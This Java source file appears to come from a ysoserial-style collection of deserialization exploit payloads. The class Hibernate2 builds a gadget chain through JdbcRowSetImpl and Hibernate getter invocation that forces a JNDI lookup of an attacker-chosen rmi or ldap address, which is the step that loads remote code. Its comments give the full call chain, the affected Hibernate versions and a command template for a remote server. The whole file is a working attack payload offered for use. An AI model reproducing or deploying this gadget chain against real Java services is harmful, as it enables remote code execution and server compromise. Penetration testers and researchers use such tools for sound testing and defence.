package payloads;


import com.sun.rowset.JdbcRowSetImpl;
import payloads.annotation.Authors;
import payloads.annotation.PayloadTest;
import util.PayloadRunner;

import java.net.URL;


/**
 *
 * Another application filter bypass
 *
 * Needs a getter invocation that is provided by hibernate here
 *
 * javax.naming.InitialContext.InitialContext.lookup()
 * com.sun.rowset.JdbcRowSetImpl.connect()
 * com.sun.rowset.JdbcRowSetImpl.getDatabaseMetaData()
 * org.hibernate.property.access.spi.GetterMethodImpl.get()
 * org.hibernate.tuple.component.AbstractComponentTuplizer.getPropertyValue()
 * org.hibernate.type.ComponentType.getPropertyValue(C)
 * org.hibernate.type.ComponentType.getHashCode()
 * org.hibernate.engine.spi.TypedValue$1.initialize()
 * org.hibernate.engine.spi.TypedValue$1.initialize()
 * org.hibernate.internal.util.ValueHolder.getValue()
 * org.hibernate.engine.spi.TypedValue.hashCode()
 *
 *
 * Requires:
 * - Hibernate (>= 5 gives arbitrary method invocation, <5 getXYZ only)
 *
 * Arg:
 * - JNDI name (i.e. rmi:<host>)
 *
 * Yields:
 * - JNDI lookup invocation (e.g. connect to remote RMI)
 *
 * Command: rmi/ldap://x.x.x.x:xx/exploit
 *
 * @author mbechler
 */
@SuppressWarnings ( {
    "restriction"
} )
@Authors({ Authors.MBECHLER })
public class Hibernate2 implements ObjectPayload<Object> {

    public Object getObject ( String command ) throws Exception {
        JdbcRowSetImpl rs = new JdbcRowSetImpl();
        rs.setDataSourceName(command);
        return Hibernate1.makeCaller(rs,Hibernate1.makeGetter(rs.getClass(), "getDatabaseMetaData") );
    }

    public static byte[] getBytes ( final String command ) throws Exception {
        return PayloadRunner.run(Hibernate2.class, command);
    }

    public static void main ( final String command ) throws Exception {
        PayloadRunner.run(Hibernate2.class, command);
    }
}
